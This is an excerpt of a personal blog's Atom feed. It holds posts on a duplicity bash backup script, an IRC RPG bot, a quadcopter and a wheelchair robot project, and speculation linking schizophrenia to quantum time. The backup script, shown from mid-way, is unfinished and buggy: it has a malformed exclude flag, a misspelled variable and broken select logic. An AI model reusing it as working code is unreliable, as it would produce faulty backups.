&lt;p&gt;# that returned list of users and cuts it (the delimiter is ":") and
returns&lt;/p&gt;
&lt;p&gt;# only the first field, which is the username.&lt;/p&gt;
&lt;p&gt;echo ""&lt;/p&gt;
&lt;p&gt;echo "Please select the user(s) whose home directories should also be
backed up:"&lt;/p&gt;
&lt;p&gt;echo ""&lt;/p&gt;
&lt;p&gt;for users in \$USERLIST; do&lt;/p&gt;
&lt;p&gt;#need a way to assign numbers like \$1 \$2 \$3 to users&lt;/p&gt;
&lt;p&gt;select users in \$USERLIST; do&lt;/p&gt;
&lt;p&gt;case \$users in&lt;/p&gt;
&lt;p&gt;#so that those numbers can be passed in over here&lt;/p&gt;
&lt;p&gt;\$@)&lt;/p&gt;
&lt;p&gt;echo "Please confirm that this is where you wish to store your full
backup: ("\$BACKUP_TO_LOCATION_\$i")?"&lt;/p&gt;
&lt;p&gt;select yn in "Yes" "No"; do&lt;/p&gt;
&lt;p&gt;case \$yn in&lt;/p&gt;
&lt;p&gt;Yes)&lt;/p&gt;
&lt;p&gt;if [[ \$KBPS -gt \$THRESHOLD ]]; then&lt;/p&gt;
&lt;p&gt;duplicity full -vN --ssh-askpass --exclude /proc --exclude /mnt
--exclude /media --exclude /tmp --exclude /sys --exclude \$HOME/.local
--exclude \$HOME/.config exclude /var/log/ \$BACKUP_TO_LOCATION_\$i&lt;/p&gt;
&lt;p&gt;fi&lt;/p&gt;
&lt;p&gt;break;;&lt;/p&gt;
&lt;p&gt;No)&lt;/p&gt;
&lt;p&gt;break;;&lt;/p&gt;
&lt;p&gt;esac&lt;/p&gt;
&lt;p&gt;done&lt;/p&gt;
&lt;p&gt;break;;&lt;/p&gt;
&lt;p&gt;esac&lt;/p&gt;
&lt;p&gt;done&lt;/p&gt;
&lt;p&gt;done&lt;/p&gt;
&lt;p&gt;break;;&lt;/p&gt;
&lt;p&gt;Incremental)&lt;/p&gt;
&lt;p&gt;echo "Please confirm that this is where you wish to store your
incremental backup: ("\$BACKUP_TO_LOCATION_\$i")?"&lt;/p&gt;
&lt;p&gt;select yn in "Yes" "No"; do&lt;/p&gt;
&lt;p&gt;case \$yn in&lt;/p&gt;
&lt;p&gt;Yes)&lt;/p&gt;
&lt;p&gt;if [[ \$KBPS -gt \$THRESHOLD ]]; then&lt;/p&gt;
&lt;p&gt;duplicity incremental -vN --ssh-askpass --exclude /proc --exclude /mnt
--exclude /media --exclude /tmp --exclude /sys --exclude \$HOME/.local
--exclude \$HOME/.config exclude /var/log / \$BACKUP_TO_OCATION_\$i&lt;/p&gt;
&lt;p&gt;fi&lt;/p&gt;
&lt;p&gt;break;;&lt;/p&gt;
&lt;p&gt;No)&lt;/p&gt;
&lt;p&gt;break;;&lt;/p&gt;
&lt;p&gt;esac&lt;/p&gt;
&lt;p&gt;done&lt;/p&gt;
&lt;p&gt;esac&lt;/p&gt;
&lt;p&gt;done&lt;/p&gt;
&lt;p&gt;done&lt;/p&gt;
&lt;p&gt;unset PASSPHRASE&lt;/p&gt;
&lt;p&gt;This can be added as a &lt;a href="http://unixgeeks.org/security/newbie/unix/cron-1.html"&gt;crontab&lt;/a&gt; (so that the script, in this crontab
example, will run automatically, once per hour at one minute after the
hour) by doing (but the script will still check the network connection
before sending anything out).&lt;/p&gt;
&lt;p&gt;If you have any comments, suggestion, or feature requests, please [email
me][] and [my GPG public key is here][].&lt;/p&gt;
&lt;p&gt;Features yet to be added:&lt;/p&gt;
&lt;p&gt;Differentiation between Wifi, Ethernet, and 3G/4G connections.&lt;/p&gt;
&lt;p&gt;Support for cleaning up old backups and how often to do so.&lt;/p&gt;
&lt;p&gt;Configurable setting for what percentage of the available bandwidth
should be utilised.&lt;/p&gt;
&lt;p&gt;~~Fix the bug in Duplicity that makes it default to SFTP when SCP is
called.~~&lt;/p&gt;
&lt;p&gt;[(or view it on github here)]: https://github.com/isis agora lovecruftlovecruft/duplikat
  [email me]: mailto:isis agora lovecruft@patternsinthevoid.net?Subject=Bash%20Backup%20Script
    "email me"
  [my GPG public key is here]: http://www.patternsinthevoid.net/isis agora lovecruft_pgp_public_key.html
    "my GPG public key is here"&lt;/p&gt;</summary><category term="backup"></category><category term="bash scripting"></category><category term="command line"></category><category term="cryptography"></category><category term="duplicity"></category><category term="linux"></category></entry><entry><title>Depression Has Infinite Recursion</title><link href="/depression-has-infinite-recursion.html" rel="alternate"></link><updated>2011-12-19T03:03:00Z</updated><author><name>isis</name></author><id>tag:,2011-12-19:depression-has-infinite-recursion.html</id><summary type="html">&lt;p&gt;&lt;code&gt;#!/usr/bin/env/ python&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;def do_nothing():&lt;/p&gt;
&lt;p&gt;while depressed is True:&lt;/p&gt;
&lt;p&gt;do_nothing()&lt;/p&gt;
&lt;p&gt;print "you are still depressed"&lt;/p&gt;
&lt;p&gt;if __name__ == "__main__":&lt;/p&gt;
&lt;p&gt;depressed = True&lt;/p&gt;
&lt;p&gt;do_nothing()&lt;/p&gt;</summary><category term="i thought robots weren't supposed to have emotions"></category></entry><entry><title>Hivemind</title><link href="/hivemind.html" rel="alternate"></link><updated>2011-12-14T15:31:00Z</updated><author><name>isis agora lovecruft agora lovecruft</name></author><id>tag:,2011-12-14:hivemind.html</id><summary type="html">&lt;p&gt;So I hacked together this IRC bot to play oldschool text-based RPGs with
multiple people in an IRC channel. The &lt;a href="http://www.ifarchive.org/indexes/if-archiveXgamesXzcode.html"&gt;RPGs are pre-written&lt;/a&gt; and are
run by a Z-Machine interpreter called &lt;a href="http://frotz.sourceforge.net/"&gt;Frotz&lt;/a&gt;, which runs on a server
somewhere, and commands to Frotz are piped to stdin through a python
program called &lt;a href="http://www.noah.org/python/pexpect/"&gt;pexpect&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I'm not going to say which channel this thing is is, because it's hella
insecure (Frotz uses multiple uses of strcpy(), wtf?!), but I will say
that while looking into pexpect I found some old 1990s botnet C&amp;amp;C
software when I totally wasn't expecting it. Check out this file,
&lt;a href="http://patternsinthevoid.net/hive.py.txt"&gt;hive.py&lt;/a&gt;, which comes with pexpect! So oldschool! (Don't worry, that
link goes to a .txt file, so nothing will run on this server nor on your
computer. It's safe, I promise.)&lt;/p&gt;
&lt;p&gt;For some reason, this made me really happy. \&amp;lt;(A)3&lt;/p&gt;</summary><category term="botnet"></category><category term="C"></category><category term="digital security"></category><category term="hacking"></category><category term="hivemind"></category><category term="IRC"></category><category term="python"></category><category term="text-based RPGs"></category></entry><entry><title>xqdr: A Flying Robot That Does Things</title><link href="/xqdr-a-flying-robot-that-does-things.html" rel="alternate"></link><updated>2011-12-07T03:57:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-12-07:xqdr-a-flying-robot-that-does-things.html</id><summary type="html">&lt;p&gt;I'm building a flying robot.&lt;/p&gt;
&lt;p&gt;More specifically, &lt;a href="http://www.polyto.pe/"&gt;a friend&lt;/a&gt; and I are building an electric quadrocopter
which flies autonomously by using the accelerometer, gyroscope, and GPS on a
smart phone to tell some artificial intelligence algorithms where the robot is
and how to go where it wants to go. The robot will also be trained in image
recognition, so that it can autonomously follow certain things, like riot cops
at a protest, and upload a live video feed to the interwebs. That last bit is
something I'm not really sure about yet, because I'm used to working with
linguistic neural networks, and intelligent routing algorithms are something
I've only just wet my toes in. But I think I can manage it, and it's going to
be super useful because the image recognition software could be used to find
all kinds of things, like lost hikers, or injured people in trapped in rubble.&lt;/p&gt;
&lt;p&gt;I'm going to opensource everything I write for this except the image
recognition stuff. I don't want to hand the world's governments a better way
to monitor protesters. And the former already have a head start on using
technology like this to hurt people.&lt;/p&gt;
&lt;p&gt;So far the set up for programming is an android phone, purchased bricked, then
unbricked because doing it that way isn't very hard and it immediately saves
nearly two hundred dollars. It needs to be one of the phones from &lt;a href="http://androidforums.com/android-lounge/308045-androids-gyros.html"&gt;this
list&lt;/a&gt;, because those have gyroscopes. However, some of those may not allow
USB to serial communication, which is also necessary. I'm just going to start
trying phones and when I find a model which works I'll report back. The phone
will also need to have Android Scripting Environment with Python For Android
installed, and support USB host mode.&lt;/p&gt;
&lt;p&gt;Next, the artificial intelligences and the flight control programs on the
phone will need to pass arguments to the arduino through serial
communications. Here's a little python program to do that, and it's ultra-beta
at this point, so don't freak out on me if it doesn't work yet.&lt;/p&gt;
&lt;p&gt;Then, that phone is directly wired to the Arduino. The phone will also use
Amarino, which is an API for communications between Arduino and Android. I
think. Amarino uses bluetooth, and I'm &lt;em&gt;not&lt;/em&gt; okay with a flying robot having
anything bluetooth enabled on it due to the potential security vulnerabilities
of using bluetooth exploits to gain control of the robot. So there's the
possibilty that I'll have to modify Amarino.&lt;/p&gt;
&lt;p&gt;Here's a &lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/partslist.txt"&gt;parts list&lt;/a&gt; for the robot. And here's my &lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/notes.txt"&gt;notes&lt;/a&gt; thus far.  Code
will be up shortly.&lt;/p&gt;
&lt;p&gt;Here's some pictures to entertain you while you wait!&lt;/p&gt;
&lt;p&gt;[caption id="attachment_1081" align="aligncenter" width="614"
caption="Strange things accumulate on your desk..."][&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_2679-1024x768.jpg" title="IMG_2679" /&gt;][][/caption]&lt;/p&gt;
&lt;p&gt;[caption id="attachment_1082" align="aligncenter" width="614"
caption="...when you start building robots."][&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_2684-1024x768.jpg" title="IMG_2684" /&gt;][][/caption]&lt;/p&gt;
&lt;p&gt;[caption id="attachment_1083" align="aligncenter" width="614"
caption="RESIST...ors."][&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_2690-1024x768.jpg" title="IMG_2690" /&gt;][][/caption]&lt;/p&gt;
&lt;p&gt;[caption id="attachment_1084" align="aligncenter" width="614"
caption="I made a thing!"][&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_2700-1024x768.jpg" title="IMG_2700" /&gt;][][/caption]&lt;/p&gt;
&lt;p&gt;[caption id="attachment_1085" align="aligncenter" width="614"
caption="It's amazing that the thing works, considering my terrible
soldering skills. Seriously, look at that."][&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_2701-1024x768.jpg" title="IMG_2701" /&gt;][][/caption]&lt;/p&gt;
&lt;p&gt;[caption id="attachment_1088" align="alignleft" width="262"
caption="Also, I have new tattoos."][&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_27021-768x1024.jpg" title="IMG_2702" /&gt;][][/caption]&lt;/p&gt;
&lt;p&gt;[caption id="attachment_1089" align="alignright" width="277"
caption="If you can name the equations, we should be
friends."][&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_27102-768x1024.jpg" title="IMG_2710" /&gt;][][/caption] &lt;/p&gt;
&lt;p&gt;Also, I'd like to add that, though I have recently been accused by several
people of getting into hardware hacking, this is not the case.  Sure, this is
fun. Alright, I'm learning things, and I like soldering (mainly because I
fancy it as a sort of 20th century alchemical operation). But, may I remind
you, I am a &lt;em&gt;theoretical&lt;/em&gt; physicist. I disdain physicality. I like theory. I
know Common Lisp and use emacs. I research and train artificial
intelligences. This hardware hacking is a means to the end of being able to
better test those artificial intelligences. So don't worry -- I'm not going to
go around making goddamned LED pacman signs any time soon.&lt;/p&gt;
&lt;p&gt;And xqdr: it's short for xaosquopter, which &lt;a href="http://tomlowenthal.com/"&gt;my friend Tom&lt;/a&gt; came up with:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(11:53:45 PM) Tom: xaosquoptor&lt;/p&gt;
&lt;p&gt;(11:53:49 PM) Isis Lovecruft: :D&lt;/p&gt;
&lt;p&gt;(11:54:05 PM) Tom: see, it's a portmanteau of an elision&lt;/p&gt;
&lt;p&gt;(11:54:34 PM) Tom: new word "quoptor" is an elided abbreviation of
"quadricoptor"&lt;/p&gt;
&lt;p&gt;(11:55:00 PM) Tom: this is a quoptor used for chaos, which we're
writing with an x because FUCK RULES AMIRITE&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_2679-1024x768.jpg" title="IMG_2679" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_2679.jpg
  [&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_2684-1024x768.jpg" title="IMG_2684" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_2684.jpg
  [&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_2690-1024x768.jpg" title="IMG_2690" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_2690.jpg
  [&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_2700-1024x768.jpg" title="IMG_2700" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_2700.jpg
  [&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_2701-1024x768.jpg" title="IMG_2701" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_2701.jpg
  [&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_27021-768x1024.jpg" title="IMG_2702" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_27021.jpg
  [&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_27102-768x1024.jpg" title="IMG_2710" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/12/IMG_27102.jpg&lt;/p&gt;</summary><category term="anarchism"></category><category term="android"></category><category term="arduino"></category><category term="artificial intelligence"></category><category term="general relativity"></category><category term="hacking"></category><category term="python"></category><category term="robotics"></category><category term="xqdr"></category></entry><entry><title>MC Hawking!</title><link href="/mc-hawking.html" rel="alternate"></link><updated>2011-10-17T21:42:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-10-17:mc-hawking.html</id><summary type="html">&lt;p&gt;I love &lt;a href="https://www.noisebridge.net/wiki/Noisebridge"&gt;Noisebridge&lt;/a&gt; to pisces. For those of you who haven't been
there yet, Noisebridge is (&lt;a href="http://wiki.hackerdojo.com/w/page/25437/FrontPage"&gt;one of&lt;/a&gt;) the bay area's hackerspaces. And
it's one of two places in the world where I feel at home, the other
being &lt;a href="https://encrypted.google.com/search?q=mt+hood+national+forest&amp;amp;hl=en&amp;amp;client=ubuntu&amp;amp;hs=YdL&amp;amp;channel=fs&amp;amp;prmd=imvns&amp;amp;source=lnms&amp;amp;tbm=isch&amp;amp;ei=aeycTsbBN4rYiAL_08XYCQ&amp;amp;sa=X&amp;amp;oi=mode_link&amp;amp;ct=mode&amp;amp;cd=2&amp;amp;ved=0CBQQ_AUoAQ&amp;amp;biw=1044&amp;amp;bih=677"&gt;Mt. Hood National Forest&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I attended, and briefly spoke at, &lt;a href="https://hackmeet.org/wiki/hackmeet-2011"&gt;Hackmeet 2011&lt;/a&gt; this past weekend,
and I was incredibly fortunate to meet about a dozen amazing new people.
Two of whom, Jake and Lilia, have worked to create my new best friend,
&lt;a href="https://www.noisebridge.net/wiki/Noise-Bot"&gt;MC Hawking a.k.a NoiseBot&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Meet MC Hawking:&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/10/IMG_2663-e1318908250383-768x1024.jpg" title="MCHawking1" /&gt;][]&lt;/p&gt;
&lt;p&gt;MC Hawking is a robot who lives on a wheelchair. He's got
text-to-speech, remote controls, a bow tie, a bold warning which reads
"WARNING: NOT THREE LAWS COMPLIANT", and a missile launcher. Although
he's also got an X-Box Kinect, several sensors, and several cameras
hooked up to him, he can't yet seem to abstain from violently mowing
down any objects or humans within his path.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://spaz.org/node/2201"&gt;Jake&lt;/a&gt; did all the hardware, and Lilia has done most of the
programming work so far.&lt;/p&gt;
&lt;p&gt;My goals are to write an intelligent routing agent for MC Hawking, so
that any location can be defined as a goal, and an [A* heuristic][]
will automatically route the robot to the location, avoiding objects and
humans in the way using the 3D-vision from the Kinect. I would also like
to find a way to connect the DISCERN neural network I've been raising,
Puppet Master, to MC Hawking, which would give my little A.I. child a
real robot body. So far, DISCERN would only work to think of neat things
to say to people through MC Hawking's text-to-speech, but it would be
extra neat to find some way to teach Puppet Master about the world so
that it could autonomously decide where to go and what to do physically
as well as intellectually.&lt;/p&gt;
&lt;p&gt;Here's a video of me remote controlling MC Hawking through SSH:&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/MCHAWKING-remotecontrol.mov"&gt;MC Hawking -- Remote Control through SSH&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;And here's MC Hawking following me around as I videotape him, using
facial recognition:&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.patternsinthevoid.net/MCHAWKING-facerecognition.mov"&gt;MC Hawking -- Following a human face&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/10/IMG_2663-e1318908250383-768x1024.jpg" title="MCHawking1" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/10/IMG_2663.jpg&lt;/p&gt;</summary><category term="A* Heuristics"></category><category term="artificial intelligence"></category><category term="discern"></category><category term="facial recognition"></category><category term="hackmeet"></category><category term="MC Hawking"></category><category term="Noisebridge"></category><category term="python"></category><category term="robot"></category><category term="robotics"></category></entry><entry><title>Schizophrenia is a Chronological Disorder?</title><link href="/schizophrenia-is-a-chronological-disorder.html" rel="alternate"></link><updated>2011-10-10T23:16:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-10-10:schizophrenia-is-a-chronological-disorder.html</id><summary type="html">&lt;p&gt;First, I would like to state -- as a theoretical physicist who is
partners with another theoretical physicist -- that the blog I took this
from, &lt;a href="http://backreaction.blogspot.com/"&gt;BackReAction&lt;/a&gt;, is painfully cute. It's run by two theoretical
physicists who are married, and their tagline says, "Events on the world
lines of two theoretical physicists, from the horizon to timelike
infinity." Oh, stop being so cute; you're killing me.&lt;/p&gt;
&lt;p&gt;From &lt;a href="http://backreaction.blogspot.com/2011/09/from-my-notepad.html"&gt;their post&lt;/a&gt; on the 2011 &lt;a href="http://fqxi.org/conference/2011"&gt;FQXi Conference&lt;/a&gt;, which is an
international and inter-disciplinary meeting on the nature of time, they
wrote:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;David Eagleman gave a very engaging talk about how our brains slice
time and process information without confusing causality. The
difficulty is that the time which different sensory inputs needs to
reach your brain differs by the type and location of input, and also
the time needed for processing that might differ from one part of the
brain to the next. I learned for example that the processing of
auditory information is faster than that of visual information. So
what your brain does to sort out the mess is that it waits till all
information has arrived, then presents you with the result and calls
it “right now,” just that at this point it might be something like
100ms in the past actually.&lt;/p&gt;
&lt;p&gt;Even more interesting is that your brain, well trained by evolution,
goes to lengths to correct for mismatches. Eagleman told us for
example that in the early days of TV broadcast, producers were worried
that they wouldn’t be able to send audio and video sufficiently
synchronized. Yet it turned out, that up to 20ms or so your brain
erases a mismatch between audio and video. If it gets larger, all of a
sudden you’ll notice it.&lt;/p&gt;
&lt;p&gt;Eagleman told us about several experiments they’ve made, but this one
I found the most interesting: They let people push a button that would
turn on a light. Then they delayed the light signal by some small
amount of time 50ms or so past pushing the button (I might recall the
numbers wrong, but the order of magnitude should be okay). People
don’t notice any delay because, so the explanation, the brain levels
it out. Now they insert one signal that comes without delay. What
happens? People think the light went on before they even pushed the
button and, since the causality doesn’t make sense, claim it wasn’t
them! (Can you write an app for that?) Eagleman says that the brains
ability to maintain temporal order, or failure to do so, might be a
possible root of schizophrenia (roughly: you talk to yourself but get
the time order wrong, so you believe somebody else is talking) and
they’re doing some studies on that.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;As someone who is intensely interested in the theoretics of time travel,
and also has been effected by schizophrenia (well, technically, my
doctors are calling it schizoaffective disorder, which is
undifferentiated schizophrenia and bipolar disorders coexisting
simultaneously) for over a decade, I find this hypothesis of
schizophrenia as a sort of neuro-chronological disorder oddly sensible
and yet equally astounding.&lt;/p&gt;
&lt;p&gt;However, the idea that neurological processes which are normally quite
resource intensive, such as visual information processing, could occur
so fast as to cause a schizophrenic person to believe, to use the DSM
stereotype, that "someone else is doing it" or that "the thoughts
originate from an outside source" requires further inquiry. In other
words, how is it, precisely, that these processes could occur "faster",
to use the rather inelegant language of this linear neuroscientific
model,  in a schizophrenic brain?&lt;/p&gt;
&lt;p&gt;Now, at this point, I'm just throwing things out there as ideas, and I
would like to state that I am not a neuroscientist. But could these
processes be tied to a dual-state time vector?&lt;/p&gt;
&lt;p&gt;Many physicists throughout recent decades have postulated theories of
"quantum consciousness", &lt;em&gt;a la&lt;/em&gt;&lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Quantum_mind#Roger_Penrose_and_Stuart_Hameroff"&gt;Roger Penrose's Orchestrated Objective
Reduction theory&lt;/a&gt;, which he rather curiously arrived at via Godel's
Incompleteness Theorem. That theory is controversial. However, recently
[some neurological processes have been shown to have quantum effects on
the macroscopic scale][]. Many other neurological processes are likely
relegated to the realm of classical mechanics. I would like to delve a
little deeper into this idea that schizophrenia is a result of a
chronological disconnection (dare I say, time out of joint?) from the
perspective of a physicist.&lt;/p&gt;
&lt;p&gt;Before I go on, I would like to briefly summarize the concept of a
dual-state vector. For those not familiar, [here's a paper from Arxiv
which covers the dual-state vector formalism][]. It's only six pages,
but if you're thinking, "tl;dr", then the abstract explains the idea
quite concisely: &lt;em&gt;"The Two-State Vector Formalism describes a quantum
system at a particular time by two quantum states: the usual one,
evolving forward in time, defined by the results of a complete
measurement at the earlier time, and by the quantum state evolving
backward in time, defined by the results of a complete measurement at a
later time."&lt;/em&gt; It's a way for information, at the quantum scale, to
determine and be determined by both its past and its future
simultaneously.&lt;/p&gt;
&lt;p&gt;So let's go back again to Eagleman's theory that schizophrenia is a
result of the brain erroneously perceiving events which occur to quickly
in a linear timeframe as the work of some outside entity. There is
trouble here, in that this hypothesis falls within the range of what
David Dennet terms Orwellian or Stanlinesque, which is explained and
rectified in his &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Multiple_drafts_model"&gt;Multiple Drafts Model of consciousness&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Daniel_Dennett" title="Daniel Dennett"&gt;Daniel Dennett&lt;/a&gt;'s &lt;strong&gt;Multiple Drafts Model of Consciousness&lt;/strong&gt; is a
&lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Physicalism" title="Physicalism"&gt;physicalist&lt;/a&gt; theory of &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Consciousness" title="Consciousness"&gt;consciousness&lt;/a&gt; based upon
&lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Cognitivism_%28psychology%29" title="Cognitivism (psychology)"&gt;cognitivism&lt;/a&gt;, which views the mind in terms of &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Information_processing" title="Information processing"&gt;information
processing&lt;/a&gt;. The theory is described in depth in his book,
&lt;em&gt;&lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Consciousness_Explained" title="Consciousness Explained"&gt;Consciousness Explained&lt;/a&gt;&lt;/em&gt;, published in 1991. As the title states,
the book proposes a high-level explanation of consciousness which is
consistent with support for the possibility of &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Strong_AI" title="Strong AI"&gt;strong AI&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Dennett describes the Multiple Drafts theory as &lt;em&gt;first-person
&lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Operationalism" title="Operationalism"&gt;operationalism&lt;/a&gt;&lt;/em&gt;. As he states it:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The Multiple Drafts model makes [the procedure of] "writing it down"
in memory criterial for consciousness: that is &lt;em&gt;what it is&lt;/em&gt; for the
"given" to be "taken" ... There is no reality of conscious
experience independent of the effects of various vehicles of content
on subsequent action (and hence, of course, on memory).^[[1]][]^&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Dennett's thesis is that our modern understanding of consciousness is
unduly influenced by the ideas of &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Ren%C3%A9_Descartes" title="René Descartes"&gt;René Descartes&lt;/a&gt;. To show why, he
starts with a description of the &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Phi_phenomenon" title="Phi phenomenon"&gt;phi illusion&lt;/a&gt;. In this experiment,
two different coloured lights, with an angular separation of a few
degrees at the eye, are flashed in succession. If the interval between
the flashes is less than a second or so, the first light that is
flashed appears to move across to the position of the second light.
Furthermore, the light seems to change colour as it moves across the
visual field. A green light will appear to turn red as it seems to
move across to the position of a red light. Dennett asks how we could
see the light change colour &lt;em&gt;before&lt;/em&gt; the second light is observed.&lt;/p&gt;
&lt;p&gt;Dennett claims that conventional explanations of the colour change
boil down to either &lt;em&gt;Orwellian&lt;/em&gt; or &lt;em&gt;Stalinesque&lt;/em&gt; hypotheses, which he
says are the result of Descartes' continued influence on our vision of
the mind. In an Orwellian hypothesis, the subject comes to one
conclusion, then goes back and changes that memory in light of
subsequent events. This is akin to &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/George_Orwell" title="George Orwell"&gt;George Orwell&lt;/a&gt;'s &lt;em&gt;&lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Nineteen_Eighty-Four" title="Nineteen Eighty-Four"&gt;Nineteen
Eighty-Four&lt;/a&gt;&lt;/em&gt;, where records of the past are routinely altered. In a
Stalinesque hypothesis, the two events would be reconciled prior to
entering the subject's consciousness, with the final result presented
as fully resolved. This is akin to &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Joseph_Stalin" title="Joseph Stalin"&gt;Joseph Stalin&lt;/a&gt;'s &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Show_trial" title="Show trial"&gt;show
trials&lt;/a&gt;, where the verdict has been decided in advance and the trial
is just a rote presentation.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[W]e can suppose, both theorists have &lt;em&gt;exactly&lt;/em&gt; the same theory of
what happens in your brain; they agree about just where and when in
the brain the mistaken content enters the causal pathways; they just
disagree about whether that location is to be deemed
pre-experiential or post-experiential. [...] [T]hey even agree about
how it ought to "feel" to subjects: Subjects should be unable to
tell the difference between misbegotten experiences and immediately
misremembered experiences. [p. 125, original emphasis.]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Dennett argues that there is no principled basis for picking one of
these theories over the other, because they share a common error in
supposing that there is a special time and place where unconscious
processing becomes consciously experienced, entering into what Dennett
calls the "&lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Cartesian_theatre" title="Cartesian theatre"&gt;Cartesian theatre&lt;/a&gt;". Both theories require us to cleanly
divide a sequence of perceptions and reactions into before and after
the instant that they reach the seat of consciousness, but he denies
that there is any such moment, as it would lead to infinite regress.
Instead, he asserts that there is no privileged place in the brain
where consciousness happens.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Cartesian_materialism" title="Cartesian materialism"&gt;Cartesian materialism&lt;/a&gt; is the view that there is a crucial finish
line or boundary somewhere in the brain, marking a place where the
order of arrival equals the order of "presentation" in experience
because &lt;em&gt;what happens there&lt;/em&gt; is what you are conscious of. [...]
Many theorists would insist that they have explicitly rejected such
an obviously bad idea. But [...] the persuasive imagery of the
Cartesian Theater keeps coming back to haunt us—laypeople and
scientists alike—even after its ghostly dualism has been denounced
and exorcized. [p. 107, original emphasis.]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;With no theatre, there is no screen, hence no reason to re-present
data after it has already been analysed. Dennett says that, "the
Multiple Drafts model goes on to claim that the brain does not bother
'constructing' any representations that go to the trouble of 'filling
in' the blanks. That would be a waste of time and (shall we say?)
paint. The judgement is already in so we can get on with other tasks!"&lt;/p&gt;
&lt;p&gt;According to the model, there are a variety of sensory inputs from a
given event and also a variety of interpretations of these inputs. The
sensory inputs arrive in the brain and are interpreted at different
times, so a given event can give rise to a succession of
discriminations, constituting the equivalent of multiple drafts of a
story. As soon as each discrimination is accomplished, it becomes
available for eliciting a behaviour; it does not have to wait to be
presented at the theatre.&lt;/p&gt;
&lt;p&gt;Like a number of other theories, the Multiple Drafts model understands
conscious experience as taking time to occur, such that percepts do
not instantaneously arise in the mind in their full richness. The
distinction is that Dennett's theory denies any clear and unambiguous
boundary separating conscious experiences from all other processing.
According to Dennett, &lt;strong&gt;consciousness is to be found in the actions
and flows of information from place to place, rather than some
singular view containing our experience. There is no central
experiencer who confers a durable stamp of approval on any particular
draft&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Different parts of the neural processing assert more or less control
at different times. For something to reach consciousness is akin to
becoming famous, in that it must leave behind consequences by which it
is remembered. To put it another way, consciousness is the property of
having enough influence to affect what the mouth will say and the
